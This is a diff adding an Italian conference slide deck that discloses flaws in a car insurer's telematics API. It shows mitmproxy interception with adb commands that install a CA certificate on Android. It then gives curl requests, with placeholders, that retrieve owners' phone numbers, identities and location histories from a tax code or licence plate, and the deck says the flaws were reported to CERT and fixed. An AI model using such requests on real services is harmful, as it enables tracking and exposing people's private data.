@@ -1,0 +1,269 @@
+<!doctype html>
+<html lang="it">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+
+        <title>CarOps: fidarsi &egrave; bene, non fidarsi &egrave; meglio! | Linux Day 2018 Bari | Andrea Scarpino</title>
+
+        <meta name="description" content="Siamo sicuri che le informazioni di posizione della nostra auto siano accessibili soltanto a noi?">
+        <meta name="author" content="Andrea Scarpino">
+
+        <link rel="stylesheet" href="css/reveal.css">
+        <link rel="stylesheet" href="css/theme/night.css">
+
+        <!-- Theme used for syntax highlighting of code -->
+        <link rel="stylesheet" href="lib/css/zenburn.css">
+
+        <!-- Printing and PDF exports -->
+        <script>
+            var link = document.createElement( 'link' );
+            link.rel = 'stylesheet';
+            link.type = 'text/css';
+            link.href = window.location.search.match( /print-pdf/gi ) ? 'css/print/pdf.css' : 'css/print/paper.css';
+            document.getElementsByTagName( 'head' )[0].appendChild( link );
+        </script>
+    </head>
+    <body>
+        <div class="reveal">
+            <div class="slides">
+                <section>
+                    <h1>CarOps: fidarsi &egrave; bene, non fidarsi &egrave; meglio!</h1>
+                    <p><small>di Andrea Scarpino</small></p>
+                    <br/>
+                    <p>Linux Day 2018 Bari - 27/10/2018</p>
+                </section>
+
+                <section>
+                    <h2>La &ldquo;scatola nera&rdquo;</h2>
+                    <div style="float: left; width: 50%;">
+                        <img data-src="images/scatola-nera.jpg">
+                    </div>
+                    <div style="float: right; width: 50%;">
+                        <ul>
+                          <li>Posizione auto tramite GPS/AGPS</li>
+                          <li>Velocit&agrave; auto</li>
+                          <li>Rilevazione sinistri</li>
+                          <li>Chiamata automatica dell'assistenza</li>
+                          <li>Sconto RC auto</li>
+                          <li class="fragment">Obbligatoria dal 31 Marzo 2018 (decisione n&ordm; 585/2014/UE)</li>
+                        </ul>
+                    </div>
+                </section>
+
+                <section>
+                    <section>
+                        <h2>Le &ldquo;App&rdquo;</h2>
+                        <div style="float: left; width: 30%;">
+                            <img data-src="images/appandroid.png">
+                        </div>
+                        <div style="float: right; width: 70%;">
+                          <p>Applicazioni per smartphone o portali Web in grado di:</p>
+                          <ul>
+                            <li>visualizzare la posizione dell'auto in tempo reale</li>
+                            <li>statistiche sui chilometri percorsi</li>
+                            <li>cronologia degli spostamenti</li>
+                          </ul>
+                        </div>
+                    </section>
+
+                    <section>
+                        <h2>Google Play Services? No, grazie.</h2>
+                        <img data-src="images/googleplayservices.png">
+                    </section>
+
+                    <section>
+                        <h2>F-Droid</h2>
+                        <div>
+                            <div style="float: left; width: 30%;">
+                                <img data-src="images/fdroid.png">
+                            </div>
+                            <div style="float: right; width: 70%;">
+                                <p>F-Droid - https://f-droid.org</p>
+                                <p>Play Store alternativo con applicazioni FLOSS</p>
+                            </div>
+                        </div>
+                    </section>
+                </section>
+
+                <section>
+                    <section>
+                        <h2>Sniffing delle chiamate</h2>
+                        <p>mitmproxy - https://mitmproxy.org/</p>
+                        <pre><code>$ mitmproxy</code></pre>
+                        <p>Server proxy in ascolto su 8080</p>
+                        <img class="fragment" data-src="images/androidproxy.jpg">
+                    </section>
+
+                    <section>
+                        <p>Workaround per HTTPS su Android &gt;= 7.x &sup1;</p>
+                        <pre><code>$ openssl x509 -noout -subject_hash_old -in ~/.mitmproxy/mitmproxy-ca-cert.pem
+c8750f0d
+$ adb root
+$ adb shell mount -o remount,rw /system
+$ adb push ~/.mitmproxy/mitmproxy-ca-cert.pem /etc/security/cacerts/c8750f0d.0
+$ adb shell chmod 644 /etc/security/cacerts/c8750f0d.0
+$ adb shell mount -o remount,ro /system
+$ adb unroot</code></pre>
+                        <p><small>&sup1; https://android-developers.googleblog.com/2016/07/changes-to-trusted-certificate.html</small></p>
+                      </section>
+
+                    <section>
+                        <img data-src="images/mitmproxy.png">
+                    </section>
+                </section>
+
+                <section>
+                    <section>
+                        <h2>Android: autenticazione</h2>
+                        <div style="float: left; width: 30%;">
+                            <img data-src="images/appandroid_auth.png">
+                        </div>
+                        <div style="float: right; width: 70%;">
+                            <div class="fragment">
+                                <p>Input:</p>
+                                <pre><code>curl -X POST \
+-d 'BLUCS&sect;&lt;taxpayers_code&gt;&sect;-1' \
+http://&lt;domain&gt;/BICServices/BICService.svc/\
+restpostcheckpicf&lt;company&gt;</code></pre>
+                            </div>
+                            <div class="fragment">
+                                <p>Risposta:</p>
+                                <pre><code>2&sect;&lt;international_calling_code&gt;&sect;&lt;cell_phone_number&gt;&sect;-1</code></pre>
+                            </div>
+                            <div class="fragment">
+                                <p>Codice fiscale inesistente:</p>
+                                <pre><code>-1&sect;&lt;international_calling_code&gt;&sect;&sect;-100%</code></pre>
+                            </div>
+                        </div>
+                    </section>
+                    <section>
+                        <h4>Android: autenticazione (cont.)</h4>
+                        <div style="float: left; width: 30%;">
+                            <img data-src="images/appandroid_auth2.png">
+                        </div>
+                        <div style="float: right; width: 70%;">
+                            <div class="fragment">
+                                <p>Input:</p>
+                                <pre><code>curl -X POST \
+-d 'BLUCS&sect;&lt;taxpayers_code&gt;&sect;&lt;device_imei&gt;&sect;&lt;android_id&gt;\
+&sect;&lt;device_brand&gt;-&lt;device_model&gt;_unknown-&lt;api_platform&gt;\
+-&lt;os_version&gt;-&lt;device_code&gt;&sect;&lt;cell_phone_number&gt;&sect;2\
+&sect;&lt;password&gt;&sect;&sect;-1' \
+http://&lt;domain&gt;/BICServices/BICService.svc/\
+restpostsmartphoneactivation&lt;company&gt;</code></pre>
+                            </div>
+                            <div class="fragment">
+                                <p>Risposta:</p>
+                                <pre><code>0&sect;&lt;some_code&gt;&sect;&lt;my_full_name&gt;</code></pre>
+                            </div>
+                        </div>
+                    </section>
+                </section>
+
+                <section>
+                    <h2>Android: geolocalizzazione</h2>
+                    <div style="float: left; width: 30%;">
+                        <img data-src="images/appandroid_geo.png">
+                    </div>
+                    <div style="float: right; width: 70%;">
+                        <div class="fragment">
+                            <p>Input:</p>
+                            <pre><code>curl -X POST \
+-d 'ASS_NEW&sect;&lt;car_license&gt;&sect;2&sect;-1' \
+http://&lt;domain&gt;/BICServices/BICService.svc/\
+restpostlastnpositions&lt;company&gt;</code></pre>
+                        </div>
+                        <div class="fragment">
+                            <p>Risposta:</p>
+                            <pre><code>0§20§&lt;another_code&gt;§DD/MM/YYYY HH:mm:SS#&lt;latitude&gt;#&lt;longitude\
+&gt;#0#1#1#1-&lt;country&gt;-&lt;state&gt;-&lt;city&gt;-&lt;street&gt;§DD/MM/YYYY\
+HH:mm:SS#&lt;latitude&gt;#&lt;longitude&gt;#0#1#1#1-[&hellip;]</code></pre>
+                        </div>
+                        <div class="fragment">
+                            <p>Targa inesistente:</p>
+                            <pre><code>-2&sect;TARGA NON ASSOCIATA%</code></pre>
+                        </div>
+                    </div>
+                </section>
+
+                <section>
+                    <section>
+                        <h2>Client Web: statistiche</h2>
+                        <img data-src="images/clientweb.png">
+                    </section>
+                    <section>
+                        <h4>Client Web: statistiche (cont.)</h4>
+                        <img data-src="images/clientweb2.png">
+                    </section>
+                    <section>
+                        <h4>Client Web: statistiche (cont.)</h4>
+                        <img data-src="images/clientweb3.png">
+                    </section>
+                    <section>
+                        <h4>Client Web: statistiche (cont.)</h4>
+                        <pre><code>curl http://&lt;domain&gt;/&lt;company&gt;/(S(&lt;uuid&gt;))/NewRemoteAuthentication.aspx?\
+RUOLO=CL&amp;ID=&lt;another_code&gt;&amp;TARGA=&lt;car_license&gt;\
+&amp;CONTRATTO=&lt;foo&gt;&amp;VOUCHER=&lt;bar&gt;</code></pre>
+                        <pre class="fragment"><code>curl http://&lt;domain&gt;/&lt;company&gt;/(S(&lt;uuid&gt;))/NewRemoteAuthentication.aspx?\
+RUOLO=CL&amp;ID=&lt;another_code&gt;&amp;TARGA=&lt;car_license&gt;</code></pre>
+                        <div class="fragment">dati nell'iframe: <pre><code>http://&lt;domain&gt;/&lt;company&gt;/(S(&lt;uuid&gt;))/NewRicerca.aspx</code></pre>
+                            <p><small>ASP.NET Cookieless</small></p>
+                        </div>
+                        <pre class="fragment"><code>curl http://&lt;domain&gt;/&lt;company&gt;/NewRemoteAuthentication.aspx?\
+RUOLO=CL&amp;ID=&lt;another_code&gt;&amp;TARGA=&lt;car_license&gt;</code></pre>
+                    </section>
+                </section>
+
+                <section>
+                    <h2>Ricapitolando</h2>
+                    <ul>
+                        <li>Dal codice fiscale si ottiene un numero di telefono</li>
+                        <li>Dalla targa si ottengono:
+                            <ul>
+                                <li>Intestatario</li>
+                                <li>Modello dell'auto</li>
+                                <li>Posizione attuale</li>
+                                <li>Cronologia di tutte le posizioni</li>
+                                <li>Statistiche sui viaggi (quantit&agrave;, orari chilometri percorsi&hellip;)</li>
+                            </ul>
+                        </li>
+                    </ul>
+
+                    <p class="fragment">Vulnerabilit&agrave; segnalate al CERT Nazionale e risolte in 45 giorni</p>
+                </section>
+
+                <section>
+                    <strong>Andrea Scarpino</strong>
+                    <p>Software Developer involved in FLOSS</p>
+                    <a href="https://andreascarpino.it/">https://andreascarpino.it</a>
+                    <p>me@andreascarpino.it | git{hub,lab}.com/ilpianista</p>
+                    <p>https://andreascarpino.it/posts/how-my-car-insurance-exposed-my-position.html</p>
+                </section>
+            </div>
+        </div>
+
+        <script src="lib/js/head.min.js"></script>
+        <script src="js/reveal.js"></script>
+
+        <script>
+            // More info https://github.com/hakimel/reveal.js#configuration
+            Reveal.initialize({
+                width: '100%',
+                height: '100%',
+                history: true,
+                progress: false,
+
+                transition: 'slide', // none/fade/slide/convex/concave/zoom
+
+                // More info https://github.com/hakimel/reveal.js#dependencies
+                dependencies: [
+                    { src: 'lib/js/classList.js', },
+                    { src: 'plugin/markdown/marked.js' },
+                    { src: 'plugin/markdown/markdown.js' },
+                    { src: 'plugin/highlight/highlight.js', async: true, callback: function() { hljs.initHighlightingOnLoad(); } }
+                ]
+            });
+        </script>
+    </body>
+</html>
